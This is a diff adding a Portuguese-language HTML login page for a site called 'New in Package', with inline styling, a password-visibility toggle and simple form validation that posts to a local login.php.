@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New in Package - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f2f5;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .content {
+            background-color: white;
+            width: 400px;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .content h1 {
+            font-size: 2.2rem;
+            font-weight: 600;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        input,
+        button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            border-color: #1877f2;
+            outline: none;
+        }
+
+        button[type="submit"] {
+            background-color: #1877f2;
+            color: white;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            opacity: 0.5;
+            pointer-events: none;
+        }
+
+        button[type="submit"]:hover {
+            background-color: #165eab;
+        }
+
+        button[type="submit"].enabled {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        a {
+            text-decoration: none;
+            color: #1877f2;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            display: inline-block;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .extra-links {
+            margin-top: 15px;
+            font-size: 0.9rem;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-container input {
+            padding-right: 40px;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>New in Package</h1>
+        <form id="loginForm" action="login.php" method="post">
+            <input type="text" name="number" id="number" placeholder="Número de telefone ou e-mail" required>
+            <div class="password-container">
+                <input type="password" name="password" id="password" placeholder="Senha" required>
+                <span class="eye-icon" id="eye-icon" onclick="togglePassword()">👁️</span>
+            </div>
+            <button type="submit" id="submitButton" class="enabled">Entrar</button>
+        </form>
+
+        <div class="extra-links">
+            <p><b>Não tem uma conta?</b></p>
+            <a href="account.html">Criar nova conta</a>
+        </div>
+    </div>
+
+    <script>
+        // Função para alternar a visibilidade da senha
+        function togglePassword() {
+            const passwordField = document.getElementById('password');
+            const eyeIcon = document.getElementById('eye-icon');
+            
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                eyeIcon.textContent = '🙈'; // Troca o ícone para esconder a senha
+            } else {
+                passwordField.type = 'password';
+                eyeIcon.textContent = '👁️'; // Ícone para mostrar a senha
+            }
+        }
+
+        // Função para validar se todos os campos estão preenchidos
+        function validateForm() {
+            const number = document.getElementById('number').value;
+            const password = document.getElementById('password').value;
+            const submitButton = document.getElementById('submitButton');
+
+            // Verifica se todos os campos estão preenchidos
+            if (number && password) {
+                submitButton.classList.add('enabled');
+            } else {
+                submitButton.classList.remove('enabled');
+            }
+        }
+
+        // Adiciona event listeners para garantir que o botão seja ativado/desativado
+        document.getElementById('number').addEventListener('input', validateForm);
+        document.getElementById('password').addEventListener('input', validateForm);
+    </script>
+</body>
+</html>
